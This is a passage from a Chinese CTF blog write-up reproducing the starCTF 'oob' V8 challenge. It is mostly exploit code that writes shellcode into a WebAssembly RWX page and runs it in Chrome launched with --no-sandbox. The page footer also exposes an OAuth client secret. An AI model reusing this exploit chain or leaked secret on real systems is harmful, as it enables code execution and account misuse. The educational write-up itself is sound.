<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

<span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'f_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>f_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_exported_func_data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_exported_func_data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1n</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>wasm_instance_addr <span class="token operator">+</span> <span class="token number">0x88n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'rwx_page_addr = 0x'</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>


<span class="token keyword">var</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> buf_backing_store_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span> <span class="token operator">+</span> <span class="token number">0x20n</span><span class="token punctuation">;</span>

<span class="token function">write64</span><span class="token punctuation">(</span>buf_backing_store_addr<span class="token punctuation">,</span> rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>chrome 打开记得关闭沙箱，因为沙箱的安全机制，让程序无法执行一些系统调用，本题的考点也没有绕过沙箱，只需要在无沙箱情况下成功 pwn 即可：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./chrome --no-sandbox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功执行 shellcode 弹出计算器<br><img src="/images/3b546c3b/pasted-36.png" alt="pwn2"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://migraine-sudo.github.io/2020/02/15/v8/">https://migraine-sudo.github.io/2020/02/15/v8/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://skylerlee.github.io/codelet/2017/03/08/build-v8/">https://skylerlee.github.io/codelet/2017/03/08/build-v8/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/vuls/203721.html">https://www.freebuf.com/vuls/203721.html</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/">https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB">https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://zhuanlan.zhihu.com/p/82854566">https://zhuanlan.zhihu.com/p/82854566</a></li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://zhuanlan.zhihu.com/p/43992828">https://zhuanlan.zhihu.com/p/43992828</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>原作者： </strong>feather
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="http://www.xi4oyu.top/3b546c3b/" title="v8 入门及 starctf-oob 复现">http://www.xi4oyu.top/3b546c3b/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
        <a target="_blank" class="social-link" href="/atom.xml">
          <span class="icon">
            <i class="fa fa-rss"></i>
          </span>

          <span class="label">RSS</span>
        </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/v8/" rel="tag"># v8</a>
              <a href="/tags/ctf/" rel="tag"># ctf</a>
              <a href="/tags/pwn/" rel="tag"># pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/ff79dc8d/" rel="prev" title="DASCTF6月赛部分writeup">
                  <i class="fa fa-chevron-left"></i> DASCTF6月赛部分writeup
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/b941c294/" rel="next" title="CVE-2021-3156">
                  CVE-2021-3156 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments gitalk-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">feather</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">369k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">5:36</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  
<script src="/js/third-party/search/local-search.js"></script>




  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">

<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"2074e89499593c7a7c7be9c09d1e18f3"}</script>
<script src="/js/third-party/comments/gitalk.js"></script>

</body>
</html>
